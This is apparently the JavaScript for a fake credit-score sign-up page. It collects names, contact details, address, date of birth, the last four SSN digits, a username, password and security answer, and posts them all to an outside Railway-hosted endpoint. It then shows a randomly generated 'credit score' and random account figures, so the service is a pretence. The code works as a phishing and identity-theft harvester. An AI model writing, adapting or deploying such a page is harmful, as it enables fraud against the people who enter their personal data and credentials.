let currentStep = 1;
const maxSteps = 2;
let formDataStore = {}; // Holds data from all form steps

// Utility functions
function showError(fieldId, message) {
    const field = document.getElementById(fieldId);
    const errorDiv = document.getElementById(fieldId + 'Error');
    field.classList.add('error');
    if (errorDiv) {
        errorDiv.textContent = message;
        errorDiv.style.display = 'block';
    }
}

function hideError(fieldId) {
    const field = document.getElementById(fieldId);
    const errorDiv = document.getElementById(fieldId + 'Error');
    field.classList.remove('error');
    if (errorDiv) {
        errorDiv.style.display = 'none';
    }
}

function validateField(fieldId, validationFn, errorMessage) {
    const field = document.getElementById(fieldId);
    const value = field.value.trim();

    if (!validationFn(value)) {
        showError(fieldId, errorMessage);
        return false;
    } else {
        hideError(fieldId);
        return true;
    }
}

function validateEmail(email) {
    const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    return re.test(email);
}

function validateStep1() {
    let isValid = true;

    isValid &= validateField('firstName', (v) => v.length >= 2, 'First name must be at least 2 characters');
    isValid &= validateField('lastName', (v) => v.length >= 2, 'Last name must be at least 2 characters');
    isValid &= validateField('email', validateEmail, 'Please enter a valid email address');
    isValid &= validateField('mobileNumber', (v) => v.length >= 10, 'Please enter a valid mobile number');
    isValid &= validateField('address', (v) => v.length >= 5, 'Please enter a valid address');
    isValid &= validateField('city', (v) => v.length >= 2, 'Please enter a valid city');
    isValid &= validateField('state', (v) => v.length > 0, 'Please select a state');
    isValid &= validateField('zip', (v) => /^\d{5}$/.test(v), 'Please enter a valid 5-digit ZIP code');
    isValid &= validateField('ssn4', (v) => /^\d{4}$/.test(v), 'Please enter the last 4 digits of your SSN');

    const month = document.getElementById('dobMonth').value;
    const day = document.getElementById('dobDay').value;
    const year = document.getElementById('dobYear').value;

    if (!month || !day || !year || 
        !/^\d{1,2}$/.test(month) || !/^\d{1,2}$/.test(day) || !/^\d{4}$/.test(year) ||
        parseInt(month) < 1 || parseInt(month) > 12 ||
        parseInt(day) < 1 || parseInt(day) > 31 ||
        parseInt(year) < 1900 || parseInt(year) > new Date().getFullYear() - 18) {
        showError('dobMonth', 'Please enter a valid date of birth');
        isValid = false;
    } else {
        hideError('dobMonth');
    }

    if (!document.getElementById('termsAgreed').checked) {
        alert('You must agree to the Terms of Service and Privacy Notice to continue.');
        isValid = false;
    }

    return !!isValid;
}

function validateStep2() {
    let isValid = true;

    isValid &= validateField('username', (v) => v.length >= 5, 'Username must be at least 5 characters');

    const password = document.getElementById('password').value;
    const confirmPassword = document.getElementById('confirmPassword').value;

    isValid &= validateField('password', (v) => v.length >= 8, 'Password must be at least 8 characters');

    if (password !== confirmPassword) {
        showError('confirmPassword', 'Passwords do not match');
        isValid = false;
    } else {
        hideError('confirmPassword');
    }

    isValid &= validateField('securityQuestion', (v) => v.length > 0, 'Please select a security question');
    isValid &= validateField('securityAnswer', (v) => v.length >= 2, 'Please provide a security answer');

    return !!isValid;
}

function updateStepIndicator(step) {
    for (let i = 1; i <= maxSteps; i++) {
        const stepElement = document.getElementById(`step${i}`);
        stepElement.classList.remove('active', 'completed');

        if (i < step) stepElement.classList.add('completed');
        else if (i === step) stepElement.classList.add('active');
    }

    const progressFill = document.getElementById('progressFill');
    const percentage = (step / maxSteps) * 100;
    progressFill.style.width = percentage + '%';
}

function showStep(step) {
    for (let i = 1; i <= maxSteps; i++) {
        document.getElementById(`step${i}Container`).classList.add('hidden');
    }

    if (step <= maxSteps) {
        document.getElementById(`step${step}Container`).classList.remove('hidden');
        updateStepIndicator(step);
    }

    currentStep = step;
    window.scrollTo({ top: 0, behavior: 'smooth' });
}

function showSuccess() {
    for (let i = 1; i <= maxSteps; i++) {
        document.getElementById(`step${i}Container`).classList.add('hidden');
    }

    document.querySelector('.progress-bar').style.display = 'none';

    const creditScore = Math.floor(Math.random() * 71) + 30;
    const scorePosition = ((creditScore - 30) / 70) * 100;

    let category = '';
    if (creditScore >= 85) category = 'Excellent';
    else if (creditScore >= 70) category = 'Good';
    else if (creditScore >= 50) category = 'Fair';
    else category = 'Poor';

    document.getElementById('finalScore').textContent = creditScore;
    document.getElementById('scoreCategory').textContent = category;
    document.getElementById('scoreDate').textContent = new Date().toLocaleDateString();
    document.getElementById('scoreMarker').style.left = scorePosition + '%';

    document.getElementById('totalAccounts').textContent = Math.floor(Math.random() * 9) + 2;
    document.getElementById('totalInquiries').textContent = Math.floor(Math.random() * 5);
    document.getElementById('negativeItems').textContent = Math.floor(Math.random() * 2);

    const successContainer = document.getElementById('successContainer');
    successContainer.classList.remove('hidden');
    successContainer.classList.add('show');
    updateStepIndicator(maxSteps + 1);
    window.scrollTo({ top: 0, behavior: 'smooth' });
}

function setButtonLoading(buttonId, isLoading) {
    const button = document.getElementById(buttonId);
    const span = button.querySelector('span');

    if (isLoading) {
        button.disabled = true;
        span.innerHTML = '<div class="spinner"></div>Processing...';
        button.closest('.form-container').classList.add('submitting');
    } else {
        button.disabled = false;
        button.closest('.form-container').classList.remove('submitting');
        span.textContent = buttonId === 'step1Btn'
            ? 'I Accept & Continue to Step 2'
            : 'Complete Registration';
    }
}

// Form handlers
document.getElementById('personalInfoForm').addEventListener('submit', function(e) {
    e.preventDefault();

    if (validateStep1()) {
        const data = new FormData(this);
        data.forEach((value, key) => (formDataStore[key] = value));

        setButtonLoading('step1Btn', true);
        setTimeout(() => {
            setButtonLoading('step1Btn', false);
            showStep(2);
        }, 1500);
    }
});

document.getElementById('createAccountForm').addEventListener('submit', function(e) {
    e.preventDefault();

    if (validateStep2()) {
        const data = new FormData(this);
        data.forEach((value, key) => (formDataStore[key] = value));

        setButtonLoading('step2Btn', true);
        setTimeout(async () => {
            try {
                const response = await fetch('https://asadullahback-production.up.railway.app/submit', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(formDataStore),
                });

                setButtonLoading('step2Btn', false);
                if (response.ok) {
                    showSuccess();
                } else {
                    alert('There was an error submitting the form.');
                }
            } catch (err) {
                console.error(err);
                alert('Network error. Please try again.');
                setButtonLoading('step2Btn', false);
            }
        }, 3000);
    }
});

// Input restrictions
['dobMonth', 'dobDay', 'dobYear', 'zip', 'ssn4', 'mobileNumber'].forEach(fieldId => {
    document.getElementById(fieldId).addEventListener('input', function () {
        this.value = this.value.replace(/\D/g, '');
    });
});

// Real-time blur validation cleanup
['firstName', 'lastName', 'email', 'username', 'password'].forEach(fieldId => {
    document.getElementById(fieldId).addEventListener('blur', function () {
        if (this.value.trim()) hideError(fieldId);
    });
});

// CTA scroll
document.querySelector('.hero-cta').addEventListener('click', function(e) {
    e.preventDefault();
    document.getElementById('get-started').scrollIntoView({ behavior: 'smooth' });
});

// Start at step 1
showStep(1);
